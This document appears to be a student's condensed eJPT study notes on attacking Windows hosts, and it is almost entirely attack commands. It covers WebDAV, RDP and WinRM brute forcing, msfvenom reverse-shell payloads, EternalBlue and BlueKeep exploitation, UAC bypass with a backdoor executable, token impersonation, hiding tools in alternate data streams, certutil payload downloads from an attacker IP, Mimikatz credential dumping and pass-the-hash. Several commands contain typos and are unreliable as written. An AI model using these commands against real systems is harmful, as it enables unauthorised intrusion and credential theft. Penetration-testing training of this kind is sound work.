# 08hakr's Short Notes eJPT
# 006 INE-Host-and-Network-Penetration-Testing-System-Host Based-Attacks

## Host Based Attacks
## Windows Vulnerabilities
- Conflicker MS08-067, EternalBlue Ms17-010, 
- information Disclosure
- buffer OVerflow
- RCE
- Privilege Escalation
- DOS System host Resources CPU RAM Network

## Frequently Exploited Windows Services 
### Microsoft IIS 80 443
 - .asp, .aspx, .config, .php
- WebDav 80 443
 - dattest and cadaver
 - snmap -sV -p80 --script=http-enum <target-ip>
 - hydra -L /usr/share/wordlists/metasploit/common_users.txt -P common_password <target-ip> http-get /webdav/
 - davtest -auth bob:password_123321 -url http://<target-ip>/webdav/ 
 - cadaver http://<target-ip>/webdav
 - cd /usr/share/webshells/
 - getting Reverse shell with meteasplot
  - creating payload 
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f asp > shell.asp
  - upload file with cadaver
  - msfconsol
  - use multi/handler
  - set payload windows/meterpereter/reverse_tcp 
  - set same data LHOST LPOSRT
  - run
  - search IIS upload  ; //use this module to automate
 
### SMB CS 445
- PSEXEC
- search smb_login
- set user_file and password_file
- pse commaond   pasexec (metaspolite module)
- psexec.py Administrator@<target-ip> cmd.exe

### MS17-010 Eternal Blue SMB 445
- vulnerable Windows windows Vistsa, 7, server 2008, 8.1, server 2012, 10, server 2016
- exploit AutoBlue-MS17-10
- nmap -sV -p445 --script=smb-vuln-ms17-010 <target-ip>
- shell_prep.sh
- python eternalblue_Exploit.py <target-ip> shellcode/sc_x64.bin
### RDP 3389
- nmap -sV <target-ip>
- msfconsole
- search rdp_scanner
- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P unix_passwords.txt rdp://<target-ip> -s 3333 -t <speed-till-16>
- xfreerdp /u:administrator /p:<password> /v:<target-ip>:3333
### BLueKeep CVE-2019-0708 RDP Vulnerability RDP
- Vulnerable XP, Vista, 7, Server 2008 R2
- Vulnerable VM windows 7 build 1/ Service pack 1
- sudo nmap -p 3389 <target-ip>
- search bluekeep
- use auxiliary and then exploit
- show targets
- Ram size 250MB
- set target to 2

### WinRM 5986/443
- nmap -sV <target-ip>
- namp -p 5985,5986 <target-ip> WSman
- crackmapexec winrm <target-ip> -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
- crackmapexec winrm <target-ip> -u administrator -p <password> -x "whoami"  
- evil-winrm.rb -u administrator -p '<password>' -i <target-ip >
- msfconsole 
- search winrm_script_exec
- use set run 

## Windows Privileges Escalation
### Windows Kernel Exploits
- vulnerable machine windows 7 servoce pack 1
- windows exoploit suggester
- windows kernel exploits
- msfconsole
- session
- getprivs
- getsystem
- search local_exploit_suggester
- hit and try search each exploit
- getuid
- systeminfo > windows7.txt
- ./windows-exploit-suggester.py --update 
- ./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo windows7.txt
- secwiki/windows-kernel-exploits
- cd C:\\Temp\\
- .\41015.exe

### Bypassing UAC (User Account COntrol) with UACMe
//Http File Server on port 80 version 2.3
``` 
UACME:
Defeat Windows User Account Control (UAC) and get Administrator privileges.
    It abuses the built-in Windows AutoElevate executables.
    It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
    Developed by https://twitter.com/hFireF0X
    Written majorly in C, with some code in C++
```
- nmap <target-ip>
- service postgresql start
- msfconsole 
- search rejetto
- use set run
- sysinfo
- pgrep explorer
- getprivs
- shell <<>> net user
- net localgroup administrators
- UACMe github 
<another-msfconsole>
- generate payload 
- msfvenom -p windows/meterpreter/reverse_tcp Lhost= Lport -f exe > 'backdoor.exe'
<another-msfconsole>
- use multi/handler
- set payload windows/meterpreter/reverse_tcp
<continue-to-privious-meterpreter>
- mkdir
- upload backdoor.exe
- upload /root/Desktop/tools/UACME/Akagai64.exe
- shell
- .\Akagi64.exe 23 C:\Temp\backdoor.exe
- sysinfo
<privious-shell-2>
- sysinfo
- getprivis
- ps 
- migrat 688

### Access Token Impersonation
- file server rejetto port 80
- nmap <target-ip>
- search rejetto
- use set run
- sysinfo
- pgrep explorer
- migrate <ps-id>
- generats error
- getprivs
- load incognito
- list_tokens -u
- impersonate_token "<username-as-it-is>"
- getuid
- pgrep explorer
- migrate <ps-id>
- getprivs
- repeat from list_tokens -u try to get NT AUTHORITY/SYSTEM
-


## Windows File System Vulnerabilities
- resources stream and data stream 
- notepad test.txt:secret.txt
- dir
- winpeas.exe
- type winpeas.exe > winwodslog.txt:winpeas.exe
- start windowslog.txt
- cd \
- cd Windows\System32
- mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
- wupdate

## Windows Credential Dumping
### Windows Password Hash
- hash stored in SAM (security accounts manager)
- LM and NTLM
### Unattended Windows setup
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Autounattend.xml
- create a revershell with msfvenom
- upload it and run then in revershell
- in win: certutil -urlcache -f http://<attcker-ip>/payload.exe payload.exe
- search -f Unattend.xml
- search for password it maybe in Base64 decode it and you get password in plain text
- psexec

### Dumping Hashes With Mimikatz
- namp -sV <target-ip>
- search badblue
- use set run
- sysinfo 
- pgrep lsass
- migrate 788
- NT AUTHORITY/SYSTEM Highest Privileges in Windowds
- load kiwi
- creds_all
- lsa_dump_sam
- lsa_dump_secrets
- cd Temp
- upload /usr/share/window-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
- lsadump::sam lsadump:secrets
- securlsa::logonpasswords

### Pass the Hash Attack
- nmap -sV <target-ip>
- service postgresql start
- search badblue
- use set run
- pgrep lsass
- migrate 
- load kiwi
- lsa_dump_sam
- search psexec
- use set run
- set target command OR Native\ upload
- crackmapexec smb <target-ip> -u <user-id> -H "<NTLM-hash>" OR -p <Plain-text-Password> -x "<command>"
  
